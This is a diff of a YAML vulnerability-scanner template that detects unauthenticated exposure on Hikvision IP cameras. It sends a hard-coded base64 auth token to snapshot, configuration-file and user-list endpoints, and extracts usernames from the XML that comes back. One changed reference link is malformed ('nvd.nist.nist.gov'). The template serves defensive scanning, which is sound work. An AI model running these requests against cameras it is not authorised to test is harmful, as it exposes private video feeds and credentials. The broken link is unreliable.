@@ -4,39 +4,34 @@ info:
   name: Hikvision IP Camera - Snapshot, Config, and User Info Exposure
   author: AbdulrahmanTamim
   severity: high
-  description: >
+  description: |
     Detects unauthenticated exposure of sensitive endpoints on vulnerable Hikvision IP cameras.
     This includes live snapshot feeds, encrypted configuration files, and full user credential XML.
     Based on exploit chaining of CVE-2021-36260 and related bypass logic.
   reference:
     - https://www.cve.org/CVERecord?id=CVE-2021-36260
-    - https://nvd.nist.gov/vuln/detail/CVE-2021-36260
+    - https://nvd.nist.nist.gov/vuln/detail/CVE-2021-36260
+    - https://seclists.org/fulldisclosure/2017/Sep/23
   tags: hikvision,iot,camera,cve,cve2021,exposure,auth-bypass,config,snapshot,xml
 
 variables:
   b64auth: YWRtaW46MTEK
 
 requests:
-
   - method: GET
     path:
       - "{{BaseURL}}/onvif-http/snapshot?auth={{b64auth}}"
     headers:
       User-Agent: Mozilla/5.0
     matchers:
-      - type: word
+      - name: "Unauthenticated Snapshot Exposure"
+        type: word
         part: header
         words:
           - "Content-Type: image/jpeg"
       - type: status
         status:
           - 200
-    extractors:
-      - type: regex
-        name: snapshot-endpoint
-        part: request
-        regex:
-          - "/onvif-http/snapshot\\?auth=.*"
 
   - method: GET
     path:
@@ -44,19 +39,14 @@ requests:
     headers:
       User-Agent: Mozilla/5.0
     matchers:
-      - type: word
+      - name: "Downloadable Config File"
+        type: word
         part: header
         words:
           - "Content-Type: application/octet-stream"
       - type: status
         status:
           - 200
-    extractors:
-      - type: regex
-        name: config-download
-        part: request
-        regex:
-          - "/System/configurationFile\\?auth=.*"
 
   - method: GET
     path:
@@ -64,7 +54,8 @@ requests:
     headers:
       User-Agent: Mozilla/5.0
     matchers:
-      - type: word
+      - name: "Exposed Usernames"
+        type: word
         words:
           - "<userName>"
           - "<userLevel>"
@@ -74,6 +65,7 @@ requests:
           - 200
     extractors:
       - type: regex
-        name: exposed-usernames
+        name: Usernames
+        group: 1
         regex:
           - "<userName>(.*?)</userName>"
